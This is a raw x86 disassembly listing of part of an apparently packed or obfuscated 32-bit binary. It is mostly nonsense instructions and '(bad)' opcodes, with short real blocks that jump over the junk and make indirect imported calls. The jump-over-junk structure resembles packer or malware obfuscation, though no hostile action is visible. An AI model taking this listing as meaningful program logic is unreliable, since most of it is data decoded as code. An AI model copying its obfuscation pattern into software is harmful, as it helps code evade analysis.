  40305a:	or     bh,BYTE PTR [ecx+0x5c]
  40305d:	daa    
  40305e:	repnz cwde 
  403060:	mov    gs,WORD PTR [ebx+0x7683dd57]
  403066:	push   cs
  403067:	fcmovbe st,st(4)
  403069:	xchg   esi,eax
  40306a:	scas   eax,DWORD PTR es:[edi]
  40306b:	std    
  40306c:	scas   al,BYTE PTR es:[edi]
  40306d:	mov    bl,0x9d
  40306f:	(bad)  
  403070:	ds xchg edx,edi
  403073:	and    edi,DWORD PTR [ebp+0x62]
  403076:	cld    
  403077:	(bad)  
  403079:	lahf   
  40307a:	fld    QWORD PTR [ebp-0x38]
  40307d:	shl    DWORD PTR [edi-0x1d],0xe
  403081:	imul   edi,DWORD PTR [esi-0x7bf3ba9d],0xc6af12d6
  40308b:	pop    edi
  40308c:	mov    bl,0x4
  40308e:	rcr    BYTE PTR [esi+0x54384f74],0xfd
  403095:	sbb    DWORD PTR [ecx+edi*8],ebp
  403098:	mov    cl,0x65
  40309a:	add    eax,0x5999e522
  40309f:	dec    ebx
  4030a0:	jo     0x4030d4
  4030a2:	je     0x4030a9
  4030a4:	push   ebx
  4030a5:	(bad)  
  4030a6:	lahf   
  4030a7:	rcr    BYTE PTR [ecx-0x5e],cl
  4030aa:	(bad)  
  4030ab:	daa    
  4030ac:	sbb    DWORD PTR [ebx+ebp*1-0x3f],esi
  4030b0:	cmp    ebp,0x841732ae
  4030b6:	popa   
  4030b7:	dec    edi
  4030b8:	or     ebp,DWORD PTR [edx]
  4030ba:	popa   
  4030bb:	outs   dx,DWORD PTR ds:[esi]
  4030bc:	(bad)  
  4030bd:	mov    al,ds:0xdec6b6d2
  4030c2:	pop    esi
  4030c3:	xor    esi,DWORD PTR [edi+0x18]
  4030c6:	shr    DWORD PTR [ebp+0x4ff35de4],0x6
  4030cd:	and    DWORD PTR [edx-0x1c7743be],edx
  4030d3:	lods   eax,DWORD PTR ds:[esi]
  4030d4:	jle    0x4030a8
  4030d6:	imul   edi,edi,0x36471eb3
  4030dc:	fwait
  4030dd:	sbb    al,0x55
  4030df:	sub    dh,BYTE PTR [ecx+0x14]
  4030e2:	mov    WORD PTR ds:0xa994d8b4,cs
  4030e8:	clc    
  4030e9:	imul   esp,edx,0xffffffe2
  4030ec:	mov    bh,0xc6
  4030ee:	cmp    DWORD PTR [esp+edx*4-0x3a4e2181],esp
  4030f5:	nop
  4030f6:	sbb    esp,DWORD PTR [edi+0x26]
  4030f9:	or     esp,esi
  4030fb:	ss enter 0xf564,0xab
  403100:	mov    bl,0xac
  403102:	pop    ecx
  403103:	mov    DWORD PTR [ebp-0x4c],eax
  403106:	mov    DWORD PTR [ebp-0x24],0x6796
  40310d:	adc    ecx,DWORD PTR ds:0x4335f4
  403113:	mov    DWORD PTR [ebp-0x1c],0x585d
  40311a:	cmp    DWORD PTR ds:0x433634,0x0
  403121:	ja     0x403148
  403127:	mov    ecx,DWORD PTR ds:0x43361c
  40312d:	xor    DWORD PTR ds:0x4335bc,ecx
  403133:	jmp    0x403148
  403138:	push   0x4335b0
  40313d:	push   0x3b68
  403142:	call   DWORD PTR ds:0x43c804
  403148:	mov    DWORD PTR [ebp-0x14],0x1c4d
  40314f:	jmp    0x403227
  403154:	jp     0x4030f1
  403156:	cmp    esp,eax
  403158:	stc    
  403159:	out    0xff,al
  40315b:	mov    edi,0xcde7a445
  403160:	mov    dl,BYTE PTR [ecx+ecx*2+0xd2674]
  403167:	add    BYTE PTR [ebx-0x26000000],bh
  40316d:	xchg   edi,eax
  40316e:	(bad)  
  403170:	mov    gs,WORD PTR [ebx+0x0]
  403173:	and    DWORD PTR [esp+edi*4+0x11ade375],esp
  40317a:	mov    ecx,0x1b277716
  40317f:	sahf   
  403180:	mov    WORD PTR [esi-0x651e349a],ds
  403186:	les    ebx,FWORD PTR [edi]
  403188:	stc    
  403189:	xchg   di,ax
  40318b:	mov    ecx,0xbe1867fa
  403190:	cmp    eax,0x9895c946
  403195:	fiadd  DWORD PTR [edx+eiz*1+0x47]
  403199:	neg    BYTE PTR [ebx]
  40319b:	test   BYTE PTR [eax+0x54],cl
  40319e:	leave  
  40319f:	sub    al,0xeb
  4031a1:	mov    WORD PTR [eax],ss
  4031a3:	jg     0x403179
  4031a5:	cmp    edi,esp
  4031a7:	xchg   esp,eax
  4031a8:	into   
  4031a9:	mov    edi,0x6ffc3c9f
  4031ae:	sar    eax,0x62
  4031b1:	mov    ds:0x2fd7810a,eax
  4031b6:	arpl   WORD PTR [edi+ebp*8+0x7d1ef45b],dx
  4031bd:	fstp   DWORD PTR ds:0xb43067c1
  4031c3:	adc    al,BYTE PTR [eax+0x4d7a7c63]
  4031c9:	pop    es
  4031ca:	xchg   edx,eax
  4031cb:	xor    eax,0x585633fe
  4031d0:	xchg   ebp,eax
  4031d1:	jp     0x403202
  4031d3:	je     0x4031b7
  4031d5:	in     al,0x98
  4031d7:	div    BYTE PTR [edx]
  4031d9:	pusha  
  4031da:	fcmovnb st,st(7)
  4031dc:	mov    eax,0xe24d7681
  4031e1:	cmp    ebx,DWORD PTR [edx]
  4031e3:	jmp    0x40319d
  4031e5:	sbb    ch,bh
  4031e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031e8:	fsub   DWORD PTR [esi]
  4031ea:	(bad)  
  4031eb:	pop    esi
  4031ec:	out    dx,eax
  4031ed:	xor    cl,BYTE PTR [ebp+0x7f9b981b]
  4031f3:	adc    al,bh
  4031f5:	xor    DWORD PTR [edi-0x25],esp
  4031f8:	dec    eax
  4031f9:	in     eax,0xc3
  4031fb:	jp     0x4031f3
  4031fd:	push   edx
  4031fe:	inc    ebx
  4031ff:	das    
  403200:	push   es
  403201:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403202:	xchg   esp,eax
  403203:	mov    eax,0xf1d7aec
  403208:	sbb    ebp,DWORD PTR [ebp+0x3b0fab24]
  40320e:	push   ss
  40320f:	mov    al,0x76
  403211:	lahf   
  403212:	mov    bh,0x42
  403214:	mov    edi,0x10b83888
  403219:	pop    esp
  40321a:	clc    
  40321b:	sub    bl,dh
  40321d:	lds    esp,FWORD PTR [ecx+ebx*1+0x13]
  403221:	dec    eax
  403222:	scas   al,BYTE PTR es:[edi]
  403223:	mov    ds:0xc76445b2,eax
  403228:	inc    ebp
  403229:	int3   
  40322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322b:	add    eax,DWORD PTR [eax]
  40322d:	add    bh,al
  40322f:	inc    ebp
  403230:	int3   
  403231:	jle    0x4032aa
  403233:	add    BYTE PTR [eax],al
  403235:	jmp    0x40330d
  40323a:	pushf  
  40323b:	push   0xffffffcd
  40323d:	adc    eax,0xebdcb7ff
  403242:	xchg   esi,eax
  403243:	mov    ch,BYTE PTR [edx-0x6b]
  403246:	add    cl,BYTE PTR [esi+0xde1380d]
  40324c:	add    BYTE PTR [eax],al
  40324e:	mov    ebx,0x8b000000
  403253:	and    eax,0x40ee7002
  403258:	pop    eax
  403259:	mov    cl,0x45
  40325b:	cmc    
  40325c:	jo     0x40329e
  40325e:	or     DWORD PTR [eax+0x45],ebp
  403261:	push   edx
  403262:	rcl    ecx,cl
  403264:	push   cs
  403265:	sbb    eax,0x16849d28
  40326a:	popa   
  40326b:	test   al,0x12
  40326d:	xchg   ebp,eax
  40326e:	add    BYTE PTR [eax],0xbd
  403271:	or     al,0x27
  403273:	hlt    
  403274:	mov    cl,0x9
  403276:	dec    ebx
  403277:	dec    eax
  403278:	fistp  WORD PTR [eax-0x5f9cee2b]
  40327e:	lds    eax,FWORD PTR [edi+ecx*4]
  403281:	ffreep st(7)
  403283:	mov    ah,0x4a
  403285:	inc    edx
  403286:	xor    BYTE PTR [ebx+0x440dcc0a],bl
  40328c:	lods   eax,DWORD PTR ds:[esi]
  40328d:	sub    DWORD PTR [ebp-0x30],0x5c
  403291:	test   BYTE PTR [eax-0x731891bb],dl
  403297:	pop    ds
  403298:	fwait
  403299:	std    
  40329a:	push   cs
  40329b:	(bad)  
  40329c:	cld    
  40329d:	add    bh,cl
  40329f:	jne    0x403243
  4032a1:	fiadd  DWORD PTR [ecx-0x6a]
  4032a4:	xor    bh,bh
  4032a6:	cmp    ebx,esp
  4032a8:	fidivr DWORD PTR [eax+0x31]
  4032ab:	je     0x4032dd
  4032ad:	rol    bh,1
  4032af:	aaa    
  4032b0:	inc    ebp
  4032b1:	mov    dl,0xf8
  4032b3:	xor    DWORD PTR [ecx-0x4d649b02],ebx
  4032b9:	jns    0x40333a
  4032bb:	xchg   esp,eax
  4032bc:	adc    BYTE PTR [ebx],0x97
  4032bf:	and    ecx,DWORD PTR [edx-0x77dd2d52]
  4032c5:	cmp    DWORD PTR [esp+eax*4],esp
  4032c8:	push   edx
  4032c9:	(bad)  
  4032ca:	adc    eax,0x45da7797
  4032cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d0:	push   cs
  4032d1:	in     eax,dx
  4032d2:	adc    esp,ebp
  4032d4:	das    
  4032d5:	cld    
  4032d6:	(bad)  
  4032d7:	lds    ebp,FWORD PTR [ebp+0x53]
  4032da:	xchg   BYTE PTR [ecx-0x228db3a5],ah
  4032e0:	cdq    
  4032e1:	jbe    0x403343
  4032e3:	jne    0x4032e7
  4032e5:	dec    ebp
  4032e6:	dec    edi
  4032e7:	pop    edx
  4032e8:	in     al,dx
  4032e9:	retf   
  4032ea:	stos   DWORD PTR es:[edi],eax
  4032eb:	pop    ecx
  4032ec:	retf   0x3e79
  4032ef:	mov    WORD PTR [ebp+0x3d92673e],ss
  4032f5:	inc    ebx
  4032f6:	jg     0x403296
  4032f8:	sub    DWORD PTR ds:0x82d9c82e,ecx
  4032fe:	fs cmc 
  403300:	xchg   ebp,eax
  403301:	jne    0x40330f
  403303:	jle    0x403370
  403305:	jl     0x4032e2
  403307:	mov    ebp,0xb83616fb
  40330c:	push   esi
  40330d:	mov    DWORD PTR [ebp-0x34],eax
  403310:	mov    eax,DWORD PTR [ebp-0x50]
  403313:	xor    ecx,DWORD PTR ds:0x4335cc
  403319:	mov    ecx,DWORD PTR [ebp-0x4c]
  40331c:	or     DWORD PTR ds:0x433554,0x880
  403326:	push   ecx
  403327:	xor    DWORD PTR ds:0x4335e4,0x6068
  403331:	push   eax
  403332:	and    DWORD PTR ds:0x433530,0x2e33
  40333c:	jmp    0x403414
  403341:	xchg   ah,cl
  403343:	xchg   edi,eax
  403344:	mov    ds:0xedb6fbdf,eax
  403349:	pop    esi
  40334a:	cmp    dh,BYTE PTR [ebp-0x61]
  40334d:	loopne 0x403315
  40334f:	cli    
  403350:	sbb    al,0x9c
  403352:	push   cs
  403353:	add    BYTE PTR [eax],al
  403355:	mov    ebx,0xe8000000
  40335a:	cmc    
  40335b:	shl    BYTE PTR [edx-0x4dab049e],cl
  403361:	into   
  403362:	mov    BYTE PTR [eax-0x14],ah
  403365:	push   0xffffff98
  403367:	nop
  403368:	outs   dx,BYTE PTR ds:[esi]
  403369:	sub    al,0x59
  40336b:	dec    eax
  40336c:	jp     0x4033ca
  40336e:	rcl    bl,cl
  403370:	bswap  edx
  403372:	mov    ds:0x9e92b641,al
  403377:	dec    ebp
  403378:	xor    ebp,DWORD PTR [ebp+ebx*4-0x13]
  40337c:	adc    eax,0xad36a46c
  403381:	lea    eax,[eax+0x28]
  403384:	lods   al,BYTE PTR ds:[esi]
  403385:	mov    ds:0xb231366e,al
  40338a:	(bad)
  40338f:	int3   
  403390:	fidiv  WORD PTR [ebx]
  403392:	inc    ebx
  403393:	iret   
  403394:	xor    BYTE PTR [ecx],0x92
  403397:	out    0xab,al
  403399:	or     ch,BYTE PTR [ebp-0x73]
  40339c:	xchg   WORD PTR [esp+eax*8],si
  4033a0:	int3   
  4033a1:	cmp    BYTE PTR [eax+edx*1-0x39],ah
  4033a5:	lahf   
  4033a6:	or     DWORD PTR [eax+0x39],edi
  4033a9:	jbe    0x403428
  4033ab:	inc    edi
  4033ac:	imul   DWORD PTR [esi]
  4033ae:	mov    cl,0xfd
  4033b0:	inc    esi
  4033b1:	sub    DWORD PTR [esi-0xc90aedf],eax
  4033b7:	sub    BYTE PTR [ecx],ch
  4033b9:	jge    0x4033e2
  4033bb:	cmp    DWORD PTR [edi+0x17],eax
  4033be:	add    dl,BYTE PTR [esi]
  4033c0:	or     dl,BYTE PTR [eax-0x9a6abb1]
  4033c6:	das    
  4033c7:	mov    ah,cl
  4033c9:	add    edx,DWORD PTR [ecx-0x71ac8da0]
  4033cf:	sar    BYTE PTR ds:0xbee184b3,0xdd
  4033d6:	fild   QWORD PTR [ebx+0x45f1d946]
  4033dc:	out    0x21,eax
  4033de:	xchg   BYTE PTR [edx+edx*4+0x2d0a3936],cl
  4033e5:	xchg   esp,eax
  4033e6:	pop    ebp
  4033e7:	test   BYTE PTR [edi],al
  4033e9:	out    0xa5,eax
  4033eb:	push   ebx
  4033ec:	push   esi
  4033ed:	adc    cl,BYTE PTR [ecx-0x47b4bc46]
  4033f3:	pop    esp
  4033f4:	aaa    
  4033f5:	leave  
  4033f6:	adc    eax,0xe0f53f0c
  4033fb:	fdivr  DWORD PTR [edi+0x41cd8b64]
  403401:	jle    0x403405
  403403:	ins    DWORD PTR es:[edi],dx
  403404:	daa    
  403405:	call   0xbddb:0x28be5ebd
  40340c:	xchg   ebx,eax
  40340d:	sbb    ebx,DWORD PTR [esi-0x7f675b40]
  403413:	cmp    eax,0x1c868
  403418:	add    BYTE PTR [eax-0x2d],ch
  40341b:	jae    0x40341d
  40341d:	add    al,ch
  40341f:	mov    cl,BYTE PTR [ecx]
  403421:	add    al,BYTE PTR [eax]
  403423:	mov    ecx,DWORD PTR [ebp-0x58]
  403426:	and    DWORD PTR ds:0x433550,0x4ec6
  403430:	mov    edx,DWORD PTR [ebp-0x54]
  403433:	and    eax,ecx
  403435:	mov    ecx,DWORD PTR [ebp-0x60]
  403438:	not    edx
  40343a:	mov    edx,DWORD PTR [ebp-0x5c]
  40343d:	and    edx,DWORD PTR ds:0x433658
  403443:	xor    eax,0x37ed
  403448:	sub    eax,ecx
  40344a:	cmp    DWORD PTR ds:0x4335b4,0x0
  403451:	jb     0x403473
  403457:	mov    edx,DWORD PTR ds:0x433640
  40345d:	sbb    DWORD PTR ds:0x433634,edx
  403463:	jmp    0x403473
  403468:	push   0x1a8f
  40346d:	call   DWORD PTR ds:0x43c7cc
  403473:	mov    ecx,DWORD PTR ds:0x4331d4
  403479:	lea    eax,[eax+ecx*1+0xb52]
  403480:	mov    ecx,DWORD PTR [ebp-0x14]
  403483:	mov    edx,DWORD PTR [ebp-0x1c]
  403486:	jmp    0x40355e
  40348b:	or     dl,BYTE PTR [edi+0x4]
  40348e:	pop    edi
  40348f:	pop    ebp
  403490:	pop    edi
  403491:	pop    ebx
  403492:	push   edi
  403493:	ds and al,0x6b
  403496:	or     eax,0x691d1fbf
  40349b:	push   edi
  40349c:	sldt   WORD PTR [eax]
  40349f:	mov    ebx,0x3d000000
  4034a4:	mov    ds:0x77fb810,al
  4034a9:	jmp    0x9213:0xd3634765
  4034b0:	dec    ebp
  4034b1:	and    ch,bl
  4034b3:	imul   edx,DWORD PTR [esi+0x7c],0xee3aa9a9
  4034ba:	outs   dx,DWORD PTR ds:[esi]
  4034bb:	jno    0x403489
  4034bd:	stos   BYTE PTR es:[edi],al
  4034be:	cwde   
  4034bf:	jnp    0x4034ce
  4034c1:	fs push es
  4034c3:	test   BYTE PTR ds:0x9e1e6cf2,bh
  4034c9:	push   cs
  4034ca:	fmul   DWORD PTR [ebp+0x3c]
  4034cd:	adc    al,BYTE PTR ds:0xbcf9b4c
  4034d3:	push   edx
  4034d4:	ficom  DWORD PTR [ecx*1+0x400a74a1]
  4034db:	retf   
  4034dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034dd:	pop    ebp
  4034de:	inc    ebp
  4034df:	daa    
  4034e0:	imul   esp,DWORD PTR [edx+0x54],0xa
  4034e4:	xor    BYTE PTR [eax+0x3d],dh
  4034e7:	fisttp WORD PTR [ebx+0x9]
  4034ea:	popf   
  4034eb:	test   BYTE PTR [eax+0x52],ah
  4034ee:	pop    ss
  4034ef:	arpl   WORD PTR ds:0x5f7b7935,ax
  4034f5:	cmp    eax,0xc11f9e20
  4034fa:	aad    0x5e
  4034fc:	sub    dh,ah
  4034fe:	sub    al,0xc5
  403500:	mov    bh,dl
  403502:	ins    BYTE PTR es:[edi],dx
  403503:	pop    edx
  403504:	or     eax,0xe591b298
  403509:	(bad)  
  40350a:	xor    ebp,ecx
  40350c:	loop   0x403512
  40350e:	fcom   QWORD PTR [edi-0x2b]
  403511:	(bad)  
  403513:	jle    0x40351f
  403515:	rol    DWORD PTR [ebp-0x73ec5e85],0x9d
  40351c:	sub    eax,0xa13e4229
  403521:	call   0x1db6:0x6de50d3b
  403528:	lods   al,BYTE PTR ds:[esi]
  403529:	adc    DWORD PTR [ecx+ebp*8-0x38658313],esp
  403530:	lods   eax,DWORD PTR ds:[esi]
  403531:	into   
  403532:	loopne 0x40358d
  403534:	lds    esi,FWORD PTR [eax+0x37]
  403537:	(bad)
  40353a:	jmp    0x403570
  40353c:	rol    BYTE PTR [esi+0xf],1
  40353f:	test   BYTE PTR [ebx+0x66],cl
  403542:	shr    edi,1
  403544:	mov    gs,WORD PTR [ebx]
  403546:	arpl   WORD PTR [eax],dx
  403548:	cld    
  403549:	sub    al,cl
  40354b:	adc    DWORD PTR [esi+0x70],ecx
  40354e:	ds clc 
  403550:	xchg   BYTE PTR [esi+edx*2-0x44792335],ch
  403557:	mov    bl,0x4f
  403559:	std    
  40355a:	mov    ds:0x2be32b37,eax
  40355f:	ror    DWORD PTR [ebx+0x5c7dc4d],1
  403565:	or     al,0x36
  403567:	inc    ebx
  403568:	add    BYTE PTR [ecx+0x49],bl
  40356b:	add    BYTE PTR [eax],al
  40356d:	and    edx,ecx
  40356f:	sbb    DWORD PTR ds:0x43353c,0x43365c
  403579:	jmp    0x403651
  40357e:	jp     0x403544
  403580:	cld    
  403581:	mov    esi,edi
  403583:	mov    ecx,0x793bf77f
  403588:	jnp    0x4035bd
  40358a:	or     BYTE PTR [ebx+0x72],bl
  40358d:	adc    dl,BYTE PTR [bx+si]
  403590:	add    BYTE PTR [eax],al
  403592:	mov    ebx,0x9e000000
  403597:	cs mov esp,0x6450e0dc
  40359d:	and    DWORD PTR [esi+0xcd9f59],edx
  4035a3:	int3   
  4035a4:	retf   
  4035a5:	add    cl,0xba
  4035a8:	inc    ecx
  4035a9:	scas   al,BYTE PTR es:[edi]
  4035aa:	fwait
  4035ab:	and    cl,al
  4035ad:	pop    ecx
  4035ae:	sar    DWORD PTR [esi+eax*2],0xa7
  4035b2:	mov    BYTE PTR [edx+0x17],bh
  4035b5:	lods   eax,DWORD PTR ds:[esi]
  4035b6:	js     0x40353f
  4035b8:	sub    al,0xc5
  4035ba:	jp     0x40355b
  4035bc:	out    0xec,al
  4035be:	cmp    edi,DWORD PTR [edx-0x2d]
  4035c1:	jae    0x4035bf
  4035c3:	mov    edi,0xe3dfdd8c
  4035c8:	test   DWORD PTR [ebp+0x4a],esi
  4035cb:	call   0x4a3c:0x952da5e3
  4035d2:	mov    bl,0x6a
  4035d4:	fsub   st,st(5)
  4035d6:	and    ch,ch
  4035d8:	adc    ecx,DWORD PTR [edx]
  4035da:	mov    esi,0xba4a3354
  4035df:	jb     0x40365a
  4035e1:	mov    edi,0xf7522d38
  4035e6:	cwde   
  4035e7:	hlt    
  4035e8:	ja     0x4035e8
  4035ea:	push   esp
  4035eb:	add    BYTE PTR [ecx+0x6072a7e4],dl
  4035f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f2:	xor    DWORD PTR [eax],edx
  4035f4:	nop
  4035f5:	add    al,0xf1
  4035f7:	and    DWORD PTR [edi],ebp
  4035f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035fa:	das    
  4035fb:	pop    ebx
  4035fc:	aam    0xc8
  4035fe:	and    esp,DWORD PTR [edi+0x2e]
  403601:	xor    edx,ecx
  403603:	into   
  403604:	int    0xc7
  403606:	push   ebp
  403607:	rcl    BYTE PTR [ebp+0x4],cl
  40360a:	sub    eax,0x774bd55
  40360f:	dec    eax
  403610:	adc    ecx,esp
  403612:	aaa    
  403613:	mov    ebx,0xa6c7b3f0
  403618:	jl     0x403694
  40361a:	cdq    
  40361b:	jnp    0x4035d9
  40361d:	or     ah,BYTE PTR [ebx+0x64]
  403620:	and    dh,0x84
  403623:	das    
  403624:	and    al,0x9a
  403626:	add    cl,BYTE PTR [ebp-0x2f79538d]
  40362c:	sbb    ebp,DWORD PTR [ecx-0x4b]
  40362f:	xor    eax,0x2819257
  403634:	lods   eax,DWORD PTR ds:[esi]
  403635:	or     edx,DWORD PTR [ebx+esi*4+0x2a]
  403639:	ss aad 0x71
  40363c:	mov    cl,0x23
  40363e:	push   ebx
  40363f:	sub    al,BYTE PTR [ebp-0x58]
  403642:	sbb    bl,al
  403644:	jb     0x403636
  403646:	pop    edx
  403647:	jge    0x403641
  403649:	jb     0x403648
  40364b:	jb     0x403691
  40364d:	fnstcw WORD PTR [esi+0x7]
  403650:	stos   DWORD PTR es:[edi],eax
  403651:	and    edx,0x14e7
  403657:	sbb    DWORD PTR ds:0x433570,0xf7e
  403661:	jmp    0x403739
  403666:	loope  0x40365f
  403668:	addr16 call 0x357e:0xfffd9a77
  403670:	cli    
  403671:	je     0x4036d6
  403673:	jns    0x4036b7
  403675:	(bad)  
  403676:	int    0x10
  403678:	add    BYTE PTR [eax],al
  40367a:	mov    ebx,0x69000000
  40367f:	neg    bl
  403681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403682:	(bad)  
  403683:	adc    DWORD PTR [esi+0x73caa4b0],ecx
  403689:	hlt    
  40368a:	xor    al,0xe0
  40368c:	jb     0x403659
  40368e:	push   ecx
  40368f:	jmp    0x40364c
  403691:	cmp    cl,bh
  403693:	pop    ebx
  403694:	jae    0x40361a
  403696:	inc    ebx
  403697:	add    ebx,ebx
  403699:	sbb    edx,DWORD PTR [esi+0x30]
  40369c:	mov    ecx,0xeb005eb6
  4036a1:	outs   dx,DWORD PTR ds:[esi]
  4036a2:	add    esi,DWORD PTR [ebp+0x74]
  4036a5:	pop    ss
  4036a6:	scas   eax,DWORD PTR es:[edi]
  4036a7:	in     al,dx
  4036a8:	call   0x6759:0x922c3ee3
  4036af:	cmp    DWORD PTR [eax-0x28],edx
  4036b2:	not    BYTE PTR [edx+0x56]
  4036b5:	inc    eax
  4036b6:	ret    0x6fc7
  4036b9:	(bad)  [eax+0x5593ec99]
  4036bf:	cli    
  4036c0:	out    dx,eax
  4036c1:	push   esi
  4036c2:	jbe    0x4036ac
  4036c4:	or     ch,bh
  4036c6:	push   esi
  4036c7:	mul    DWORD PTR [ecx+0x2906ab38]
  4036cd:	and    ah,cl
  4036cf:	dec    esi
  4036d0:	adc    dh,BYTE PTR [edi+0x54]
  4036d3:	push   cs
  4036d4:	ja     0x4036b4
  4036d6:	cwde   
  4036d7:	fsubrp st(0),st
  4036d9:	xchg   edx,eax
  4036da:	fcom   QWORD PTR [edx]
  4036dc:	sub    BYTE PTR [ecx+0x4dd01bb7],dh
  4036e2:	mov    bl,0x62
  4036e4:	fist   DWORD PTR [eax+0x3b]
  4036e7:	mov    cl,0xd
  4036e9:	bound  eax,QWORD PTR [edi+0x5f1f4d6b]
  4036ef:	(bad)  
  4036f0:	mov    eax,0x2efa1844
  4036f5:	retf   
  4036f6:	xchg   esi,eax
  4036f7:	into   
  4036f8:	or     al,0x65
  4036fa:	inc    ebp
  4036fb:	xchg   esp,eax
  4036fc:	out    0xd7,al
  4036fe:	mov    esp,0x3e333a8d
  403703:	enter  0x51da,0x55
  403707:	pop    es
  403708:	push   edi
  403709:	push   ss
  40370a:	nop
  40370b:	enter  0xe875,0xe0
  40370f:	ja     0x403697
  403711:	std    
  403712:	adc    DWORD PTR [ebx+0x4b],ecx
  403715:	int3   
  403716:	or     BYTE PTR [esi+edx*8-0x5cba677d],bh
  40371d:	je     0x403718
  40371f:	sub    DWORD PTR [ebx],ecx
  403721:	les    ebx,FWORD PTR [esi+ecx*4-0xc]
  403725:	das    
  403726:	adc    al,0x1b
  403728:	pop    ebx
  403729:	rcr    BYTE PTR [eax+0x7f],1
  40372c:	push   ebp
  40372d:	iret   
  40372e:	jg     0x403783
  403730:	into   
  403731:	ins    BYTE PTR es:[edi],dx
  403732:	rol    DWORD PTR ds:0xc4dd48ad,cl
  403738:	push   0x400ea81
  40373d:	add    BYTE PTR [eax],al
  40373f:	mov    DWORD PTR ds:0x43363c,0x5713
  403749:	cmp    edx,DWORD PTR [eax]
  40374b:	mov    DWORD PTR ds:0x43361c,0x40b5
  403755:	jne    0x40ab43
  40375b:	adc    eax,ecx
  40375d:	mov    eax,DWORD PTR [edi]
  40375f:	mov    ecx,DWORD PTR [edi+0x4]
  403762:	cmp    DWORD PTR ds:0x433534,0x0
  403769:	jg     0x403785
  40376f:	add    ecx,0xe8d
  403775:	jmp    0x403785
  40377a:	push   0x1c1f
  40377f:	call   DWORD PTR ds:0x43c7d0
  403785:	mov    ecx,DWORD PTR [ebp-0x8]
  403788:	xor    eax,esi
  40378a:	add    eax,0x99b8624d
  40378f:	cmp    eax,DWORD PTR [ecx]
  403791:	jmp    0x403869
  403796:	in     eax,0xf2
  403798:	cmc    
  403799:	xchg   ecx,eax
  40379a:	not    DWORD PTR [edi-0x704b091b]
  4037a0:	fbld   TBYTE PTR [ebp+0x14]
  4037a3:	call   0x0:0x11885f1b
  4037aa:	mov    ebx,0xaf000000
  4037af:	jmp    0x403803
  4037b1:	push   ss
  4037b2:	fldenv [edx-0x79]
  4037b5:	mov    ah,0xb2
  4037b7:	xchg   ecx,eax
  4037b8:	(bad)
  4037bd:	mov    ah,0x39
  4037bf:	imul   ecx,eax,0x6f
  4037c2:	les    eax,FWORD PTR [ebx+0x3e]
  4037c5:	fwait
  4037c6:	aam    0x27
  4037c8:	clc    
  4037c9:	xor    eax,0x92032f77
  4037ce:	xchg   edx,eax
  4037cf:	push   ecx
  4037d0:	jb     0x403776
  4037d2:	mov    ah,0xa2
  4037d4:	and    BYTE PTR [ebx+0x34],cl
  4037d7:	jns    0x403827
  4037d9:	scas   eax,DWORD PTR es:[edi]
  4037da:	sbb    ch,bh
  4037dc:	(bad)  
  4037dd:	ins    DWORD PTR es:[edi],dx
  4037de:	inc    edx
  4037df:	xchg   esi,eax
  4037e0:	ret    0x9a41
  4037e3:	jo     0x40385e
  4037e5:	and    ebx,DWORD PTR ds:0xc18bc656
  4037eb:	dec    esp
  4037ec:	rol    ebx,0x1b
  4037ef:	push   ecx
  4037f0:	dec    edi
  4037f1:	or     eax,0x7cd0fb02
  4037f6:	add    DWORD PTR [edx+ebx*4],0x954cc348
  4037fd:	pop    esi
  4037fe:	push   eax
  4037ff:	bound  edx,QWORD PTR [esi+0x13]
  403802:	cmp    BYTE PTR [ebx],bh
  403804:	adc    ebx,DWORD PTR [ebx+0x71]
  403807:	pop    ebp
  403808:	mov    ch,bl
  40380a:	dec    edi
  40380b:	aad    0x51
  40380d:	clc    
  40380e:	dec    esp
  40380f:	mov    bl,0x29
  403811:	sbb    BYTE PTR [edi+0x66],dh
  403814:	xchg   ecx,eax
  403815:	mov    ds:0x6af04507,al
  40381a:	cmp    BYTE PTR [edx-0x5c],cl
  40381d:	(bad)  
  40381e:	cmp    DWORD PTR gs:[eax+0x6a],edi
  403822:	loopne 0x4037c5
  403824:	(bad)  
  403826:	mov    al,ds:0xd4b486d6
  40382b:	inc    edx
  40382c:	jl     0x403818
  40382e:	cli    
  40382f:	pop    ecx
  403830:	xor    bh,BYTE PTR [esi]
  403832:	sub    ch,BYTE PTR [eax-0x55b29d54]
  403838:	mov    edi,0xb8e6ca71
  40383d:	jle    0x40380a
  40383f:	sbb    al,0x33
  403841:	sub    ebp,ecx
  403843:	cmp    dh,BYTE PTR [ecx-0xb0cc562]
  403849:	xchg   ecx,eax
  40384a:	sub    eax,0xdae935ea
  40384f:	adc    al,0x2
  403851:	cwde   
  403852:	inc    edx
  403853:	adc    DWORD PTR [edx-0x31a8158d],edi
  403859:	shl    DWORD PTR [edx],cl
  40385b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40385c:	pop    ebx
  40385d:	cmp    al,0xff
  40385f:	sbb    ebx,eax
  403861:	sbb    al,0xf2
  403863:	push   eax
  403864:	sti    
  403865:	pop    esi
  403866:	mov    ecx,0x850fdeae
  40386b:	push   ss
  40386c:	add    al,BYTE PTR [eax]
  40386e:	add    BYTE PTR [ebx-0x35ccefbb],cl
  403874:	mov    ecx,DWORD PTR [ebp+0x28]
  403877:	cmp    DWORD PTR ds:0x4335a8,0x0
  40387e:	ja     0x403893
  403884:	dec    edx
  403885:	jmp    0x403893
  40388a:	push   DWORD PTR [ebp-0x18]
  40388d:	call   DWORD PTR ds:0x43c808
  403893:	xor    DWORD PTR [eax],ecx
  403895:	mov    eax,DWORD PTR [ebp+0x10]
  403898:	mov    ecx,DWORD PTR [ebp+0x20]
  40389b:	mov    edx,DWORD PTR [ebp+0x24]
  40389e:	xor    ecx,esi
  4038a0:	jmp    0x403978
  4038a5:	arpl   ax,si
  4038a7:	mov    dl,0x2f
  4038a9:	mov    bl,0x6f
  4038ab:	(bad)  
  4038ac:	cld    
  4038ad:	js     0x4038f4
  4038af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038b0:	mov    eax,ds:0xde972aef
  4038b5:	inc    ebx
  4038b6:	adc    al,BYTE PTR [eax]
  4038b8:	add    BYTE PTR [ebx+0x5a000000],bh
